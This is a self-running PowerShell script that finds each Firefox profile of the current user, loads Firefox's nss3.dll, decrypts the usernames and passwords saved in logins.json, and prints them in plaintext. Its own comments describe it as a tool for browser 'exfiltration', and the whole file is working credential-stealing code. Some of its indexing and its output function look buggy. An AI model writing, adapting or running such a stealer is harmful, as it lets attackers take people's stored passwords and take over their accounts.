Function ConvertFrom-NSS
{
    <#
    .SYNOPSIS

    Converts sensitive information (firefox passwords) to plaintext

    .PARAMETER Data

    The base64 encoded and encrypted data to decrypt
    Can be an array

    .PARAMETER ProfileDir

    The firefox profile directory of the encoded data
    #>

    Param
    (
        [Parameter(Position = 0, Mandatory = $true)]
        [String[]] $Data,

        [Parameter(Position = 1, Mandatory = $true)]
        [String] $ProfileDir
    )

    # Search for the nss3.dll file
    $locations = @(
        Join-Path $env:ProgramFiles 'Mozilla Firefox'
        Join-Path ${env:ProgramFiles(x86)} 'Mozilla Firefox'
        Join-Path $env:ProgramFiles 'Nightly'
        Join-Path ${env:ProgramFiles(x86)} 'Nightly'
    )

    [String] $NSSDll = ''
    foreach($loc in $locations)
    {
        $nssPath = Join-Path $loc 'nss3.dll'
        if(Test-Path $nssPath)
        {
            $NSSDll = $nssPath
            break
        }
    }
    if($NSSDll -eq '')
    {
        return $NULL
    }

    # Based on https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-3/

    # Create the ModuleBuilder
    $DynAssembly = New-Object System.Reflection.AssemblyName('NSSLib')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('NSSLib', $False)

    # Define a new class
    $TypeBuilder = $ModuleBuilder.DefineType('NSS', 'Public, Class')
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
    )

    # Define NSS_Init
    $PInvokeMethodInit = $TypeBuilder.DefineMethod(
        'NSS_Init',
        [Reflection.MethodAttributes] 'Public, Static',
        [Int],
        [Type[]] @([String]))
    $FieldValueArrayInit = [Object[]] @(
        'NSS_Init',
        $True,
        $True,
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::ANSI
    )
    $SetLastErrorCustomAttributeInit = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @($NSSDll),
        $FieldArray,
        $FieldValueArrayInit)
    $PInvokeMethodInit.SetCustomAttribute($SetLastErrorCustomAttributeInit)

    # Define SecItem Struct
    $StructAttributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $StructBuilder = $ModuleBuilder.DefineType('SecItem', $StructAttributes, [System.ValueType])
    $StructBuilder.DefineField('type', [int], 'Public') | Out-Null
    $StructBuilder.DefineField('data', [IntPtr], 'Public') | Out-Null
    $StructBuilder.DefineField('len', [int], 'Public') | Out-Null
    $SecItemType = $StructBuilder.CreateType()

    # Define PK11SDR_Decrypt
    $PInvokeMethodDecrypt = $TypeBuilder.DefineMethod(
        'PK11SDR_Decrypt',
        [Reflection.MethodAttributes] 'Public, Static',
        [Int],
        [Type[]] @($SecItemType, $SecItemType.MakeByRefType()))
    $FieldValueArrayDecrypt = [Object[]] @(
        'PK11SDR_Decrypt',
        $True,
        $True,
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Unicode
    )
    $SetLastErrorCustomAttributeDecrypt = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @($NSSDll),
        $FieldArray,
        $FieldValueArrayDecrypt)
    $PInvokeMethodDecrypt.SetCustomAttribute($SetLastErrorCustomAttributeDecrypt)

    $NSS = $TypeBuilder.CreateType()

    # Initiate the NSS library
    $NSS::NSS_Init($ProfileDir) | Out-Null

    $decryptedArray = New-Object System.Collections.ArrayList
    foreach($dataPart in $Data)
    {
        # Decode data into bytes and marshal them into a pointer
        $dataBytes = [System.Convert]::FromBase64String($dataPart)
        $dataPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dataBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($dataBytes, 0, $dataPtr, $dataBytes.Length)

        # Set up structures
        $encrypted = [Activator]::CreateInstance($SecItemType)
        $encrypted.type = 0
        $encrypted.data = $dataPtr
        $encrypted.len = $dataBytes.Length

        $decrypted = [Activator]::CreateInstance($SecItemType)
        $decrypted.type = 0
        $decrypted.data = [IntPtr]::Zero
        $decrypted.len = 0

        # Decrypt the data
        $NSS::PK11SDR_Decrypt($encrypted, [ref] $decrypted) | Out-Null

        # Get string data back out
        $bytePtr = $decrypted.data
        $byteData = [byte[]]::new($decrypted.len)
        [System.Runtime.InteropServices.Marshal]::Copy($bytePtr, $byteData, 0, $decrypted.len)
        $dataStr = [System.Text.Encoding]::UTF8.GetString($byteData)

        # Add the result to the array
        $decryptedArray.Add($dataStr) | Out-Null

        # Deallocate the pointer memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($dataPtr)
    }
    
    return $decryptedArray.ToArray()
}

Function Find-FirefoxFiles
{
    <#
    .SYNOPSIS

    Finds the main files used for firefox browser exfiltration

    .DESCRIPTION

    Finds the paths to the following files for the current user:
    Bookmarks, Cookies, History, Login Data, Preferences, Top Sites, Web Data
    #>

    Param
    (
        [Parameter(Position = 0, Mandatory = $true)]
        $Profile
    )

    #$profile = Select-FirefoxProfile -Profiles $profiles

    $locations = @{
        'profile' = $Profile

        # SQLITE History, Bookmarks, and probably Downloads
        'places' = (Join-Path -Path $Profile -ChildPath 'places.sqlite')

        # Sqlite Cookies
        'cookies' = (Join-Path -Path $Profile -ChildPath 'cookies.sqlite')

        # Sqlite form history
        'forms' = (Join-Path -Path $Profile -ChildPath 'formhistory.sqlite')

        # Json saved passwords
        # NSS Encrypted, decrypt using ConvertFrom-NSS
        'passwords' = (Join-Path -Path $Profile -ChildPath 'logins.json')
    }
    
    # Only return the locations that exist
    $verifiedLocations = @{}
    foreach($loc in $locations.GetEnumerator())
    {
        if(Test-Path $loc.Value)
        {
            $verifiedLocations.add($loc.Name, $loc.Value)
        }
    }

    return $verifiedLocations
}

Function Print-Output
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $true)]
        $Result
    )

    echo "Site: $($revised.hostname)"
    echo "User: $($revised.username)"
    echo "Pass: $($revised.password)"
}

Function Get-FirefoxPasswords
{
    <#
    .SYNOPSIS

    Gets firefox passwords in plaintext
    #>

    # Get locations of firefox files

    $profilesDir = Join-Path -Path $env:APPDATA -ChildPath 'Mozilla\Firefox\Profiles\'
    $profiles = Get-ChildItem -Path $profilesDir | Where-Object { $_.PSIsContainer }
        
    for ($index = 0; $index -lt $profiles.count; $index++)
    {
        echo "[i] $($profiles[$index])"
        $core = Join-Path -Path $profilesDir -ChildPath ($profiles[$index].Name)
        $firefoxFiles = Find-FirefoxFiles -Profile $core
        
        if ($firefoxFiles['passwords'] -ne $null) 
        {
            # Read passwords json file and get profile dir
            $passwordData = ((Get-Content -Path $firefoxFiles['passwords']) | ConvertFrom-Json).logins
            $profileDir = $firefoxFiles['profile']
            
            # Revised is the returned object while decrypt is a list of things to decrypt
            # Decrypt size is length * 2 because for each entry, both the username and password are encrypted
            $length = $passwordData.Length
            $revised = @(0) * $length
            $decrypt = @(0) * ($length * 2)

            # Add items to be decrypted
            for($i = 0; $i -lt $length; $i++)
            {
                $decrypt[($i * 2) - 1] = $passwordData[$i].encryptedUsername
                $decrypt[($i * 2)] = $passwordData[$i].encryptedPassword
            }

            # Decrypt the items
            $decrypted = ConvertFrom-NSS -Data $decrypt -ProfileDir $profileDir

            # Populate the revised array and return it
            for($i = 0; $i -lt $length; $i++)
            {
                $revisedPart = $passwordData[$i] | Select-Object * -ExcludeProperty @('httpRealm', 'encryptedUsername', 'encryptedPassword')
                $revisedPart | Add-Member -MemberType 'NoteProperty' -Name 'username' -Value $decrypted[($i * 2) - 1]
                $revisedPart | Add-Member -MemberType 'NoteProperty' -Name 'password' -Value $decrypted[($i * 2)]
                $revised[$i] = $revisedPart
            }

            Print-Output -Result $revised
        }
        else 
        {
            echo "No password for this profile."
        }
        echo ""
    }
    
}

Get-FirefoxPasswords
